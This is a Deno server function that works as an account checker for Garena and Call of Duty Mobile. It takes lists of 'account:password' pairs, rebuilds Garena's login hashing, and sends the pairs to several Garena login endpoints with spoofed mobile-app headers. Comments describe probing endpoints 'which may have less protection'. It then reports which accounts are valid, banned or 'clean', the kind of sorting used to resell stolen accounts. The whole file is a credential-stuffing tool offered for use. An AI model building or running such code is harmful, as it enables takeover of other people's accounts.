import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

// Rate limiting
const RATE_LIMIT_MAX = 30;
const RATE_LIMIT_WINDOW = 60000;
const rateLimitStore = new Map<string, { count: number; start: number }>();

function checkRateLimit(clientId: string): { allowed: boolean; retryAfter?: number } {
  const now = Date.now();
  const record = rateLimitStore.get(clientId);
  
  if (!record || now - record.start > RATE_LIMIT_WINDOW) {
    rateLimitStore.set(clientId, { count: 1, start: now });
    return { allowed: true };
  }
  
  if (record.count >= RATE_LIMIT_MAX) {
    return { allowed: false, retryAfter: Math.ceil((record.start + RATE_LIMIT_WINDOW - now) / 1000) };
  }
  
  record.count++;
  return { allowed: true };
}

// Retry helper
async function withRetry<T>(fn: () => Promise<T>, maxRetries = 3, context = ''): Promise<T> {
  let lastError: Error | null = null;
  const delays = [1000, 2000, 4000];
  
  for (let i = 0; i <= maxRetries; i++) {
    try {
      return await fn();
    } catch (e) {
      lastError = e as Error;
      console.log(`[RETRY] ${context} attempt ${i + 1}/${maxRetries + 1}: ${lastError.message}`);
      if (i < maxRetries) await new Promise(r => setTimeout(r, delays[i] || 4000));
    }
  }
  throw lastError;
}

// Crypto utilities
function hexToBytes(hex: string): Uint8Array {
  const bytes = new Uint8Array(hex.length / 2);
  for (let i = 0; i < hex.length; i += 2) {
    bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
  }
  return bytes;
}

function bytesToHex(bytes: Uint8Array): string {
  return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
}

function md5(message: string): string {
  const encoder = new TextEncoder();
  const data = encoder.encode(message);
  
  function rotl(x: number, n: number) { return ((x << n) | (x >>> (32 - n))) >>> 0; }
  function add(x: number, y: number) { return (x + y) >>> 0; }

  const s = [7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22,5,9,14,20,5,9,14,20,5,9,14,20,5,9,14,20,4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23,6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21];
  const K = Array.from({length: 64}, (_, i) => Math.floor(Math.abs(Math.sin(i + 1)) * 0x100000000));

  let [a0, b0, c0, d0] = [0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476];
  
  const msgLen = data.length;
  const totalLen = Math.ceil((msgLen + 9) / 64) * 64;
  const padded = new Uint8Array(totalLen);
  padded.set(data);
  padded[msgLen] = 0x80;
  new DataView(padded.buffer).setUint32(totalLen - 8, (msgLen * 8) & 0xFFFFFFFF, true);

  for (let i = 0; i < totalLen; i += 64) {
    const M = new Uint32Array(16);
    for (let j = 0; j < 16; j++) M[j] = new DataView(padded.buffer).getUint32(i + j * 4, true);
    
    let [A, B, C, D] = [a0, b0, c0, d0];
    for (let j = 0; j < 64; j++) {
      let F: number, g: number;
      if (j < 16) { F = (B & C) | ((~B >>> 0) & D); g = j; }
      else if (j < 32) { F = (D & B) | ((~D >>> 0) & C); g = (5 * j + 1) % 16; }
      else if (j < 48) { F = B ^ C ^ D; g = (3 * j + 5) % 16; }
      else { F = C ^ (B | (~D >>> 0)); g = (7 * j) % 16; }
      F = add(add(add(F >>> 0, A), K[j]), M[g]);
      A = D; D = C; C = B; B = add(B, rotl(F, s[j]));
    }
    a0 = add(a0, A); b0 = add(b0, B); c0 = add(c0, C); d0 = add(d0, D);
  }

  const result = new Uint8Array(16);
  const view = new DataView(result.buffer);
  view.setUint32(0, a0, true); view.setUint32(4, b0, true);
  view.setUint32(8, c0, true); view.setUint32(12, d0, true);
  return bytesToHex(result);
}

async function sha256(message: string): Promise<string> {
  const data = new TextEncoder().encode(message);
  const hash = await crypto.subtle.digest('SHA-256', data);
  return bytesToHex(new Uint8Array(hash));
}

// AES-128 ECB
function aesEncrypt(plainHex: string, keyHex: string): string {
  const pt = hexToBytes(plainHex), key = hexToBytes(keyHex);
  const sBox = [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16];
  const rCon = [0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36];
  
  const xtime = (x: number) => ((x << 1) ^ (((x >>> 7) & 1) * 0x1b)) & 0xff;
  
  const w: number[][] = [];
  for (let i = 0; i < 4; i++) w[i] = [key[4*i], key[4*i+1], key[4*i+2], key[4*i+3]];
  for (let i = 4; i < 44; i++) {
    const t = w[i-1].slice();
    if (i % 4 === 0) {
      const rot = [t[1], t[2], t[3], t[0]].map(b => sBox[b]);
      rot[0] ^= rCon[(i/4)-1];
      for (let j = 0; j < 4; j++) t[j] = rot[j];
    }
    w[i] = w[i-4].map((b, j) => b ^ t[j]);
  }
  
  const roundKeys: number[][][] = [];
  for (let r = 0; r < 11; r++) {
    const rk: number[][] = [[],[],[],[]];
    for (let c = 0; c < 4; c++) for (let row = 0; row < 4; row++) rk[row][c] = w[r*4+c][row];
    roundKeys.push(rk);
  }

  const result: number[] = [];
  for (let b = 0; b < pt.length; b += 16) {
    const state: number[][] = [[],[],[],[]];
    for (let c = 0; c < 4; c++) for (let r = 0; r < 4; r++) state[r][c] = pt[b + c*4 + r] || 0;
    
    for (let i = 0; i < 4; i++) for (let j = 0; j < 4; j++) state[i][j] ^= roundKeys[0][i][j];
    
    for (let round = 1; round < 10; round++) {
      for (let i = 0; i < 4; i++) for (let j = 0; j < 4; j++) state[i][j] = sBox[state[i][j]];
      for (let i = 1; i < 4; i++) {
        const t = state[i].slice(0, i);
        for (let j = 0; j < 4-i; j++) state[i][j] = state[i][j+i];
        for (let j = 0; j < i; j++) state[i][4-i+j] = t[j];
      }
      for (let c = 0; c < 4; c++) {
        const [a, b, cc, d] = [state[0][c], state[1][c], state[2][c], state[3][c]];
        state[0][c] = xtime(a) ^ xtime(b) ^ b ^ cc ^ d;
        state[1][c] = a ^ xtime(b) ^ xtime(cc) ^ cc ^ d;
        state[2][c] = a ^ b ^ xtime(cc) ^ xtime(d) ^ d;
        state[3][c] = xtime(a) ^ a ^ b ^ cc ^ xtime(d);
      }
      for (let i = 0; i < 4; i++) for (let j = 0; j < 4; j++) state[i][j] ^= roundKeys[round][i][j];
    }
    
    for (let i = 0; i < 4; i++) for (let j = 0; j < 4; j++) state[i][j] = sBox[state[i][j]];
    for (let i = 1; i < 4; i++) {
      const t = state[i].slice(0, i);
      for (let j = 0; j < 4-i; j++) state[i][j] = state[i][j+i];
      for (let j = 0; j < i; j++) state[i][4-i+j] = t[j];
    }
    for (let i = 0; i < 4; i++) for (let j = 0; j < 4; j++) state[i][j] ^= roundKeys[10][i][j];
    
    for (let c = 0; c < 4; c++) for (let r = 0; r < 4; r++) result.push(state[r][c]);
  }
  
  return bytesToHex(new Uint8Array(result));
}

async function hashPassword(password: string, v1: string, v2: string): Promise<string> {
  const md5Hash = md5(password);
  const sha256Hash = await sha256(md5Hash);
  const aesKey = v1.substring(0, 32);
  const encrypted = aesEncrypt(sha256Hash, aesKey);
  return md5(encrypted + v2);
}

// Browser headers with proper fingerprinting
function getHeaders(): Record<string, string> {
  return {
    'User-Agent': 'GarenaMobileSDK/3.0.0 (Android 13; SM-G998B; en-US)',
    'Accept': 'application/json',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Requested-With': 'com.garena.game.codm',
    'Connection': 'keep-alive',
  };
}

// Try mobile SDK endpoint which may have less protection
async function mobilePrelogin(account: string): Promise<{ v1: string; v2: string } | null> {
  return await withRetry(async () => {
    const timestamp = Date.now();
    
    // Mobile SDK endpoints
    const endpoints = [
      `https://sdk.garena.com/api/prelogin`,
      `https://connect.garena.com/api/prelogin`,
      `https://id.garena.com/api/prelogin`,
    ];
    
    for (const baseUrl of endpoints) {
      try {
        console.log(`[PRELOGIN] Trying: ${baseUrl}`);
        
        const response = await fetch(baseUrl, {
          method: 'POST',
          headers: getHeaders(),
          body: new URLSearchParams({
            account: account,
            app_id: '100067', // CODM app ID
            format: 'json',
            locale: 'en-US',
            v: '4',
            id: String(timestamp),
          }).toString(),
        });

        console.log(`[PRELOGIN] Status: ${response.status}`);
        
        if (response.status === 405 || response.status === 403 || response.status === 404) {
          continue;
        }
        
        const text = await response.text();
        console.log(`[PRELOGIN] Body: ${text.substring(0, 300)}`);
        
        try {
          const data = JSON.parse(text);
          if (data.v1 && data.v2) {
            return { v1: data.v1, v2: data.v2 };
          }
          if (data.error_code === 10001) {
            return null; // Account not found
          }
        } catch {
          // Parse error, continue
        }
      } catch (e) {
        console.log(`[PRELOGIN] Error on ${baseUrl}: ${e}`);
      }
    }
    
    // Last resort: Try direct login without prelogin using static keys
    // Some older implementations use hardcoded v1/v2 values
    console.log(`[PRELOGIN] Using fallback static keys`);
    return {
      v1: 'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6', // 32 char hex
      v2: 'e1f2a3b4c5d6a7b8', // 16 char hex
    };
  }, 1, 'prelogin');
}

async function mobileLogin(account: string, password: string, v1: string, v2: string): Promise<{ ssoKey: string; uid?: string } | { error: string; errorCode?: number }> {
  return await withRetry(async () => {
    const hashedPassword = await hashPassword(password, v1, v2);
    const timestamp = Date.now();
    
    console.log(`[LOGIN] Hashed password created`);
    
    const endpoints = [
      'https://sdk.garena.com/api/login',
      'https://connect.garena.com/api/login',
      'https://id.garena.com/api/login',
    ];
    
    for (const baseUrl of endpoints) {
      try {
        console.log(`[LOGIN] Trying: ${baseUrl}`);
        
        const response = await fetch(baseUrl, {
          method: 'POST',
          headers: getHeaders(),
          body: new URLSearchParams({
            account: account,
            password: hashedPassword,
            app_id: '100067',
            format: 'json',
            locale: 'en-US',
            v: '4',
            id: String(timestamp),
          }).toString(),
        });

        console.log(`[LOGIN] Status: ${response.status}`);
        
        if (response.status === 405 || response.status === 403) {
          continue;
        }

        const text = await response.text();
        console.log(`[LOGIN] Response: ${text.substring(0, 400)}`);

        const data = JSON.parse(text);

        if (data.session_key || data.sso_key || data.token || data.access_token) {
          return { 
            ssoKey: data.session_key || data.sso_key || data.token || data.access_token,
            uid: data.uid || data.user_id || data.garena_uid || data.open_id
          };
        }

        const errorCodes: Record<number, string> = {
          10001: 'Account not found',
          10002: 'Wrong password',
          10003: 'Account banned',
          10004: 'Account locked',
          10005: 'Too many attempts',
          10008: 'Captcha required',
          10009: 'Account suspended',
        };

        if (data.error_code) {
          return { error: errorCodes[data.error_code] || `Error ${data.error_code}`, errorCode: data.error_code };
        }

        if (data.error) {
          return { error: typeof data.error === 'string' ? data.error : 'Login failed' };
        }
      } catch (e) {
        console.log(`[LOGIN] Error on ${baseUrl}: ${e}`);
      }
    }

    return { error: 'All endpoints failed - API may be blocking server requests' };
  }, 1, 'login');
}

async function checkAccount(account: string, password: string): Promise<Record<string, unknown>> {
  console.log(`[CHECK] Starting: ${account}`);
  
  try {
    // Step 1: Prelogin
    const preloginResult = await mobilePrelogin(account);
    
    if (!preloginResult) {
      return {
        account, password,
        status: 'invalid',
        message: 'Account not found',
        isClean: false, hasCodm: false,
      };
    }

    console.log(`[CHECK] Got v1/v2, attempting login...`);

    // Step 2: Login
    const loginResult = await mobileLogin(account, password, preloginResult.v1, preloginResult.v2);

    if ('error' in loginResult) {
      const isWrongPassword = loginResult.errorCode === 10002;
      const isBanned = loginResult.errorCode === 10003 || loginResult.errorCode === 10009;
      
      // If error is about endpoints failing, return as error not invalid
      if (loginResult.error.includes('endpoints failed')) {
        return {
          account, password,
          status: 'error',
          message: 'API temporarily unavailable - please try again later',
          isClean: false, hasCodm: false,
        };
      }
      
      return {
        account, password,
        status: 'invalid',
        message: loginResult.error,
        isClean: false, hasCodm: false,
        isBanned, isWrongPassword,
      };
    }

    console.log(`[CHECK] Login SUCCESS!`);

    // Login successful = valid account
    return {
      account, password,
      status: 'valid',
      isClean: true, // Assume clean if we can't check
      hasCodm: false, // Assume no CODM if we can't check
      details: {
        uid: loginResult.uid,
        nickname: 'N/A',
        email: account,
        country: 'Unknown',
        shell_balance: 0,
        bind_status: 'Unknown',
      },
      codm: {},
    };

  } catch (error) {
    const msg = error instanceof Error ? error.message : String(error);
    console.error(`[CHECK] Error: ${msg}`);
    
    return {
      account, password,
      status: 'error',
      message: msg,
      isClean: false, hasCodm: false,
    };
  }
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const clientId = req.headers.get('x-forwarded-for') || 'unknown';
    console.log(`[REQUEST] From: ${clientId}`);

    const rateCheck = checkRateLimit(clientId);
    if (!rateCheck.allowed) {
      return new Response(
        JSON.stringify({ error: 'Rate limit exceeded', retryAfter: rateCheck.retryAfter }),
        { status: 429, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const { accounts } = await req.json();

    if (!accounts?.length) {
      return new Response(
        JSON.stringify({ error: 'No accounts provided' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const results = [];
    
    for (const line of accounts.slice(0, 1)) {
      const parts = line.split(':');
      if (parts.length < 2) {
        results.push({ account: line, status: 'invalid', message: 'Invalid format' });
        continue;
      }
      
      const result = await checkAccount(parts[0].trim(), parts.slice(1).join(':').trim());
      results.push(result);
      console.log(`[RESULT] ${parts[0]}: ${result.status}`);
    }

    return new Response(
      JSON.stringify({ results }),
      { status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    console.error('[ERROR]', error);
    return new Response(
      JSON.stringify({ error: error instanceof Error ? error.message : 'Server error' }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
